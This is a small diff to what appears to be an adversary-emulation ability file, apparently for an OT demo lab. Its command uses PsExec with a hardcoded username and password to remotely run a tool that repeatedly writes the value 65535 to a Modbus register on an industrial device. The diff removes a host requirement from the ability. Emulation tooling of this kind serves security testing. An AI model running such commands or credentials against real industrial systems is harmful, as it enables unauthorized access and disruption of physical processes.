@@ -17,9 +17,3 @@
           Start-Process -FilePath "C:\Users\Public\psexec.exe" -ArgumentList '\\172.18.24.12', '-u', 'txone', '-p', 'tx1otdemo', '-d', '-realtime', 'C:\Windows\Temp\modbus_writer.exe', '-ip', '192.168.95.11', '-reg', '1', '-cmd', 'write_register', '-val', '65535', '-period', '1' -NoNewWindow
         payloads:
           - psexec.exe
-      requirements:
-        - module: fact
-          relationships:
-            - source: host.ip
-              edge: not equals
-              target: 172.18.24.12
